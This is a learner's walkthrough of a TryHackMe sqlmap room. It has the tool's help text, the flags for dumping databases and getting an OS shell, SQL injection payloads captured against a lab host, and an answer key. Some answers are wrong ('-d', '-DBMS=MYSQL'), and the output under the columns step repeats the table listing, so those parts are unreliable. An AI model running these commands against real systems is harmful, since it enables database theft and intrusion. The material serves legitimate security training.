            SQLMAP - Tryhackme 
            ------------------

Sqlmap Command:
    
 See help:-        sqlmap -h    for advanced help: -hh

 abdul@rahman$ sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'


==========================================================================================
Basic Command:

    Options	                       |                         Description
-----------------------------------------------------------------------
    -u URL, --url=URL	              Target URL (e.g. "http://www.site.com/vuln.php?id=1")

    --data=DATA                       Data string to be sent through POST (e.g. "id=1")

    --random-agent                    Use randomly selected HTTP User-Agent header value

    -p TESTPARAMETER                  Testable parameter(s)

    --level=LEVEL                     Level of tests to perform (1-5, default 1)

    --risk=RISK                       Risk of tests to perform (1-3, default 1)



Enumeration commands:

These options cab be used to enumerate the back-end database management system information, structure, and data contained in tables.

    Options                       |                      Description
-------------------------------------------------------------------------------------------
    -a, --all	                                    Retrieve everything

    -b, --banner	                                Retrieve DBMS banner

    --current-user                                  Retrieve DBMS current user

    --current-db                                    Retrieve DBMS current database

    --passwords                                     Enumerate DBMS users password hashes

    --dbs                                           Enumerate DBMS databases

    --tables                                        Enumerate DBMS database tables

    --columns                                       Enumerate DBMS database table columns

    --schema                                        Enumerate DBMS schema

    --dump                                          Dump DBMS database table entries

    --dump-all                                      Dump all DBMS databases tables entries

    --is-dba                                        Detect if the DBMS current user is DBA

    -D <DB NAME>                                       DBMS database to enumerate

    -T <TABLE NAME>                                 DBMS database table(s) to enumerate

    -C COL                                          DBMS database table column(s) to enumerate


Operating System access command:
---------------------------------

These options can be used to access the back-end database management system on the target opreating system.

    Options                                                      Description
--------------------------------------------------------------------------------------------
    --os-shell	                                Prompt for an interactive operating system shell
    --os-pwn	                                Prompt for an OOB shell, Meterpreter or VNC
    --os-cmd=OSCMD                              Execute an operating system command
    --priv-esc                                  Database process user privilege escalation
    --os-smbrelay                            One-click prompt for an OOB shell, Meterpreter or VNC



===============================================================================================

Simple HTTP Based Test;
------------------------
- sqlmap -u http://testsite.com/page.php?id=1  --dbs

Here we have used two flag: -u to state the vulnerable URL and --dbs to enumerate the database/

Simple HTTP POST Based Test:
----------------------------
* First, we need to identify the vulnerable POST request and save it. In order to save the request, 
   Right on request, select 'click to copy', and save it to a directory. You have also copy the whole 
   request and save it to a text file as well.  # You can use burpsuite to capture request.

You'll notice in the request above, we have POST parameter 'blood_group' which could a vulnerable parameter/
Save HTTP POST request:
-----------------------
    abdul@rahman$ cat req.txt
    POST /blood/nl-search.php HTTP/1.1
    Host: 10.10.17.116
    Content-Length: 16
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://10.10.17.116
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://10.10.17.116/blood/nl-search.php
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
    Connection: close

    blood_group=B%2B


Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:
    - sqlmap -r req.txt -p blood_group --dbs
    - sqlmap -r <request-file> -p <vulnerable_parameter> --dbs

Here we have used two flag: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database

    abdul@rahman$ sqlmap -r req.txt -p blood_group --dbs
    [19:31:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
    [19:31:50] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
    it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
    for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
    [19:33:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
    [19:33:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
    [19:33:09] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
    [19:33:09] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
    [19:33:10] [WARNING] reflective value(s) found and filtering out
    [19:33:12] [INFO] target URL appears to be UNION injectable with 8 columns
    [19:33:13] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
    POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
    sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
    ---
    Parameter: blood_group (POST)
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

        Type: UNION query
        Title: Generic UNION query (NULL) - 8 columns
        Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
    ---
    [19:33:16] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Ubuntu
    web application technology: Nginx 1.10.3
    back-end DBMS: MySQL >= 5.0.12
    [19:33:17] [INFO] fetching database names
    available databases [6]:
    [*] blood
    [*] information_schema
    [*] mysql
    [*] performance_schema
    [*] sys
    [*] test


Now that we have the dabases, let's extract table from the table 'blood'
Using GET based Method:

- sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables
- sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables

Using POST based Method:
- sqlmap -r req.txt -p blood_group -D blood --tables
- sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables

Once we run these commands, we should get the the tables.

       abdul@rahman$ sqlmap -r req.txt -p blood_group -D blood --tables
       [19:35:57] [INFO] parsing HTTP request from 'req.txt'
       [19:35:57] [INFO] resuming back-end DBMS 'mysql'
       [19:35:57] [INFO] testing connection to the target URL
       sqlmap resumed the following injection point(s) from stored session:
       ---
       Parameter: blood_group (POST)
           Type: time-based blind
           Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
           Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

           Type: UNION query
           Title: Generic UNION query (NULL) - 8 columns
           Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
            ---
       [19:35:58] [INFO] the back-end DBMS is MySQL
       web server operating system: Linux Ubuntu
       web application technology: Nginx 1.10.3
       back-end DBMS: MySQL >= 5.0.12
       [19:35:58] [INFO] fetching tables for database: 'blood'
       [19:35:58] [WARNING] reflective value(s) found and filtering out
       Database: blood
       [3 tables]
       +----------+
       | blood_db |
       | flag     |
       | users    |
       +----------+

Once we have available tables, now let’s gather the columns from the table blood_db.

Using GET based Method:
----------------------
- sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns
- sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns

     abdul@rahman$ sqlmap -r req.txt -D blood -T blood_db --columns
     [19:35:57] [INFO] parsing HTTP request from 'req.txt'
     [19:35:57] [INFO] resuming back-end DBMS 'mysql'
     [19:35:57] [INFO] testing connection to the target URL
     sqlmap resumed the following injection point(s) from stored session:
     ---
     Parameter: blood_group (POST)
          Type: time-based blind
          Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
          Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

          Type: UNION query
          Title: Generic UNION query (NULL) - 8 columns
          Payload: blood_group=B+' UNION ALL SELECT    NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
            ---
      [19:35:58] [INFO] the back-end DBMS is MySQL
      web server operating system: Linux Ubuntu
      web application technology: Nginx 1.10.3
      back-end DBMS: MySQL >= 5.0.12
      [19:35:58] [INFO] fetching tables for database: 'blood'
      [19:35:58] [WARNING] reflective value(s) found and filtering out
      Database: blood
      [3 tables]
      +----------+
      | blood_db |
      | flag     |
      | users    |
      +----------+


Or we can simply dump all the available database and tables using the follwing commands.

Using GET based Method:
----------------------
- 'sqlmap -r req.txt -D <database_name> --dump-all'
- 'sqlmap -r req.txt-p  -D <database_name> --dump-all'



```
Answer the question:-

1- Which flag or option will allow you to add a URL to the command?
   Ans:  -u 

2- Which flag would you use to add data to a POST request?
   Ans:  --data

3- There are two parameters: username and password. How would you tell sqlmap to use the username parameter for the attack?
   Ans:  -p username

4- Which flag would you use to show the advanced help menu?
   Ans:  -hh

5- Which flag allows you to retrieve everything?
   Ans:  -a

6- Which flag allows you to select the database name?
   Ans:  -d

7- Which flag would you use to retrieve database tables?
   Ans:  --tables

8- Which flag allows you to retrieve a table’s columns?
   Ans: --columns

9- Which flag allow you to dump all the database entries?
   Ans:  --dump-all

10- Which flag will gives you an interactive SQL shell prompt?
    Ans:   --sql-shell

11- You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases?
    Ans: -DBMS=MYSQL
```







